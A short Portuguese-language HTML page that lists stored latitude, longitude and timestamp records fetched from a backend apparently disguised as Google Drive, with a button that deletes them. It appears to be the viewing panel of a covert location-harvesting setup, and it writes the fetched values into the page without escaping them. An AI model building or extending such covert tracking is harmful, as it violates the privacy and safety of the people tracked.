<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dados de Localização</title>
    <link rel="stylesheet" href="styles2.css"> <!-- Certifique-se de que o CSS é aplicado -->
</head>
<body>
    <div class="data-container">
        <div id="locations"></div>
        <button id="clearData">Limpar Dados</button>
    </div>

    <script>
        fetch('https://google-drive-vbfg.onrender.com/api/locations')
            .then(response => response.json())
            .then(data => {
                const locationsDiv = document.getElementById('locations');
                if (data.length === 0) {
                    locationsDiv.innerText = 'Nenhum dado armazenado.';
                } else {
                    data.forEach(location => {
                        const locElement = document.createElement('div');
                        locElement.classList.add('location-item');
                        locElement.innerHTML = `<strong>Latitude:</strong> ${location.latitude}<br><strong>Longitude:</strong> ${location.longitude}<br><strong>Data:</strong> ${new Date(location.timestamp).toLocaleString('pt-BR')}`;
                        locationsDiv.appendChild(locElement);
                    });
                }
            })
            .catch(error => console.error('Error fetching locations:', error));

        document.getElementById('clearData').addEventListener('click', function() {
            // Aqui você pode adicionar a lógica para limpar os dados no backend
            fetch('https://google-drive-vbfg.onrender.com/api/locations', { method: 'DELETE' }) // Exemplo de requisição para limpeza
                .then(response => {
                    if (response.ok) {
                        document.getElementById('locations').innerHTML = ''; // Limpa a exibição
                    }
                })
                .catch(error => console.error('Error clearing locations:', error));
        });
    </script>
</body>
</html>
